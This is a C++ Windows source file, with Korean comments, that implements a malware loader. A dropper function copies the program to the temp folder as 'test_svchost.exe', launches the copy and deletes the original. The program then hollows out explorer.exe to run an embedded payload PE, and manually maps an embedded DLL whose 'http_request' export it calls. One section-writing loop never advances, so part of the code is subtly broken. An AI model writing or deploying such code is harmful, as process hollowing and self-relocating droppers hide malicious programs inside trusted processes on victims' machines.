#include <stdio.h>
#include <windows.h>
#include <iostream>
#include "process_.h"
#include "File_Injector.h"
#include "PE_FILE.h"
#include "dropper.h"


#pragma comment(lib, "ntdll.lib")


//unsigned char DLL_RawData[2142720] = {0x40, ... ... } -> .\Attack_File 내 있는 manual_mapping_dll.cpp 파일의 raw 데이터, 실행 전 dll 파일의 raw 데이터를 저장하는 과정이 필요함.

WCHAR wszProcessPath[] = L"explorer.exe";
typedef void(*WorkerFunctionCall)();

PBYTE LoadResourceFile(LPCWSTR resourceName, SIZE_T& resourceSize) {
	HMODULE hModule = GetModuleHandle(NULL);
	if (hModule == NULL) {
		return NULL;
	}

	HRSRC hResource = FindResource(hModule, resourceName, RT_RCDATA);
	if (hResource == NULL) {
		return NULL;
	}

	HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
	if (hLoadedResource == NULL) {
		return NULL;
	}

	PBYTE pResourceData = (PBYTE)LockResource(hLoadedResource);
	resourceSize = SizeofResource(hModule, hResource);

	return pResourceData;
}

void Process_Hollowing(PBYTE peBuffer, SIZE_T peSize)
{
	process explorer_Process;
	BOOL create_status = explorer_Process.create(wszProcessPath, true, true);

	if (create_status)
	{

		ULONG_PTR target_imagebase = explorer_Process.imagebase();

		if (explorer_Process.unmap(target_imagebase, true))
		{
			File_Injector injector(explorer_Process.handle());

			PE_FILE malware_pefile(peBuffer, peSize); 
			ULONG malware_pefile_Size = malware_pefile.imageSize();

			ULONG_PTR target_Addr = injector.alloc(malware_pefile_Size, target_imagebase, true);
			LONG_PTR relativeOffset = 0;


			if (target_Addr != 0)
			{
				ULONG_PTR TempAddr = malware_pefile.memAlloc(malware_pefile_Size);

				relativeOffset = malware_pefile.Get_Relative_Offset(target_Addr);
				malware_pefile.Set_Imagebase(target_Addr);

				injector.writeHeader(TempAddr, (ULONG_PTR)malware_pefile.peHeader(), malware_pefile.peHeaderSize());

				ULONG_PTR currentSection = malware_pefile.Get_FirstSection();
				for (int nSection = 0; nSection < malware_pefile.numberOfSection(); ++nSection)
				{
					injector.writeSection(TempAddr, (ULONG_PTR)malware_pefile.peHeader(), currentSection);
				}

				malware_pefile.relocate(TempAddr, relativeOffset);

				injector.WriteVirtualMemory(target_Addr, TempAddr, malware_pefile_Size, true);
				explorer_Process.patchEntryPoint(target_Addr, malware_pefile.addressOfEntryPoint());
				explorer_Process.resume();
			}

		}
	}
}

void DLL_Manual_Mapping()
{
	File_Injector injector; // null 시 자기 프로세스

	PE_FILE malware_dll(DLL_RawData, sizeof(DLL_RawData));
	ULONG malware_dllSize = malware_dll.imageSize();

	ULONG_PTR TargetAddress = injector.alloc(malware_dllSize, NULL, true);// NULL = 자기 자신 할당
	LONG_PTR relative_Offset = 0;
	if (TargetAddress != 0)
	{
		ULONG_PTR TempAddr = malware_dll.memAlloc(malware_dllSize);
		
		if (TempAddr != 0)
		{
			relative_Offset = malware_dll.Get_Relative_Offset(TargetAddress);
			malware_dll.Set_Imagebase(TargetAddress);

			injector.writeHeader(TempAddr, (ULONG_PTR)malware_dll.peHeader(), malware_dll.peHeaderSize());

			ULONG_PTR currentSection = malware_dll.Get_FirstSection();
			for (int nSection = 0; nSection < malware_dll.numberOfSection(); ++nSection)
			{
				injector.writeSection(TempAddr, (ULONG_PTR)malware_dll.peHeader(), currentSection);
				currentSection = malware_dll.Get_NextSection(currentSection);
			}
			malware_dll.resolveIAT(TempAddr);

			malware_dll.relocate(TempAddr, relative_Offset);

			injector.WriteVirtualMemory(TargetAddress, TempAddr, malware_dllSize, true);

			injector.callEntryPoint(TargetAddress, malware_dll.addressOfEntryPoint());

			WorkerFunctionCall ulFuncionAddress = (WorkerFunctionCall)malware_dll.getAddress((HMODULE)TargetAddress, (char*)"http_request");
			if (ulFuncionAddress)
			{
				ulFuncionAddress();
			}
		}
	}
}
void dropper_Func()
{
	Dropper dropper;

	std::wstring tempPath;
	std::wstring exePath;
	std::wstring tempExePath;

	dropper.GetTemp_Path(tempPath);
	dropper.GetCurrentExePath(exePath);

	tempExePath = tempPath + L"\\test_svchost.exe";

	if (dropper.CopyExeToTemp(exePath, tempExePath)) {
		dropper.RunTempExe(tempExePath);
		dropper.DeleteCurrentExe();
	}
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PSTR LpCmdLine,
	INT nCmdShow
)
{
	int argc;
	wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	SIZE_T peSize = 0;
	//argc > 1 && wcscmp(argv[1], L"-copy") == 0
	if (argc > 1 && wcscmp(argv[1], L"-copy") == 0) {
		LocalFree(argv);

		PBYTE peBuffer = LoadResourceFile(MAKEINTRESOURCE(101), peSize);
		Process_Hollowing(peBuffer, peSize);

		Sleep(10000);
		DLL_Manual_Mapping();

		return 0;
	}

	dropper_Func();
	LocalFree(argv);


	return 0;
}
